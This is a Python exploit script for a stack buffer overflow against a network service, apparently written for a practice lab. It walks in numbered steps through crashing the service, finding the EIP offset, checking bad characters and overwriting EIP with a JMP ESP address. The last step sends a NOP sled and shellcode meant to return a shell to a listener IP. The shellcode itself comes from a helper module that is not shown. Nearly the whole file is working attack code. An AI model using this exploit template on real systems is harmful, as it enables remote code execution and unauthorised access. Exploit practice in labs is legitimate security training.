#!/usr/bin/python3

import socket
import time
import sys
# import subprocess


from MyDefinitions import MyDefinitions


def main(*args):
    # define constants
    md = MyDefinitions(
        "10.10.236.15",  # target IP
        31337,  # target port
        eip_offset=146,  # set the offset after finding it in step 3
        eip_post=500,  # set to find the space after eip in step 4
        bad_chars=["\x0A"],  # add bad characters as you find them in step 5
        eip_overwrite="\xc3\x14\x04\x08",  # set the desired eip once you know it, before running step 6
        LHOST="10.11.6.224"  # listener IP
    )

    step = args[0]
    payload = ""

    # filler function. 
    # main(step, filler size)
    if step == 1:
        print("Sending filler of A\'s to initiate a crash.")
        payload = md.filler(args[1])

    # create a pattern using msf-pattern create -l [size integer]
    # main(step, pattern size)
    elif step == 2:
        payload = md.create_pattern(args[1])

    # find the offset by using the msf-pattern_offset -l [size integer] -q [pattern]
    # main(step, pattern size, pattern)
    elif step == 3:
        print(md.find_offset_by_pattern(args[1], args[2]).decode())
        sys.exit()

    # combines the offset, eip space, and post eip space
    # define the constants
    # main(step)
    elif step == 4:
        payload = md.eip_offset + md.eip_mark + md.eip_post
        # print(payload)

    # looking for bad characters
    elif step == 5:
        md.find_bad_chars()
        payload = md.eip_offset + md.eip_mark + md.find_bad_chars()
        # sys.exit()

    # step 6 is manual in immunity debbuger:
    # FFE4 jmp esp
    # !mona modules
    # !mona find -s "\xff\xe4" -m [dll library name]
    elif step == 6:
        payload = md.eip_offset + md.eip_overwrite + md.nop_sled + md.eip_post

    elif step == 7:
        md.make_the_shell(args[1])
        sys.exit()

    # step 7 generating and sending the payload
    # SINGLE STAGE payload type
    elif step == 8:
        payload = md.eip_offset + md.eip_overwrite + md.nop_sled + md.the_shell()

    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((md.RHOST, md.RPORT))

        print(f"Attempting to send the payload to {md.RHOST}")
        s.send(payload + '\r\n'.encode())
        s.close()

    except Exception as err:
        print(err)

    except KeyboardInterrupt:
        print("\nReceived the interrupt command.")


if __name__ == "__main__":
    main(1,200)
    # main(2,200)
    # main(3,200,39654138)
    # main(4)
    # main(5)
    # main(6)
    # main(7, 2)
    # main(8)
